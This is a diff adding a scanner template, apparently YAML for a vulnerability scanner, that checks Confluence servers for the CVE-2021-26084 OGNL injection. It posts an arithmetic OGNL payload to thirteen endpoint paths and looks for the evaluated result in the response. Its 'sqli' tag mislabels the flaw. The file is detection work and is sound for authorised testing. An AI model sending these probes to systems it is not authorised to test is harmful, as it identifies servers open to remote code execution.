@@ -1,0 +1,132 @@
+name: Atlassian Confluence OGNL Injection CVE-2021-26084
+manual: true
+query: app="Confluence" || product="Confluence" || company="Atlassian"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /pages/createpage-entervariables.action?SpaceKey=x
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+  r1:
+    request:
+      method: POST
+      path: /pages/createpage-entervariables.action
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+  r2:
+    request:
+      method: POST
+      path: /confluence/pages/createpage-entervariables.action?SpaceKey=x
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+  r3:
+    request:
+      method: POST
+      path: /confluence/pages/createpage-entervariables.action
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+  r4:
+    request:
+      method: POST
+      path: /wiki/pages/createpage-entervariables.action?SpaceKey=x
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+  r5:
+    request:
+      method: POST
+      path: /wiki/pages/createpage-entervariables.action
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+  r6:
+    request:
+      method: POST
+      path: /pages/doenterpagevariables.action
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+  r7:
+    request:
+      method: POST
+      path: /pages/createpage.action?spaceKey=myproj
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+  r8:
+    request:
+      method: POST
+      path: /pages/templates2/viewpagetemplate.action
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+  r9:
+    request:
+      method: POST
+      path: /pages/createpage-entervariables.action
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+  r10:
+    request:
+      method: POST
+      path: /template/custom/content-editor
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+  r11:
+    request:
+      method: POST
+      path: /templates/editor-preload-container
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+  r12:
+    request:
+      method: POST
+      path: /users/user-dark-features
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"value=\"aaaa{140592=null}")
+expression: r0() || r1() || r2() || r3() || r4() || r5() || r6() || r7() || r8() ||
+  r9() || r10() || r11() || r12()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-26084
+  - https://jira.atlassian.com/browse/CONFSERVER-67940
+  - https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html
+  description: Confluence is Atlassian's professional enterprise knowledge management
+    and collaboration software, which can also be used to build enterprise wikis.
+  tags: sqli
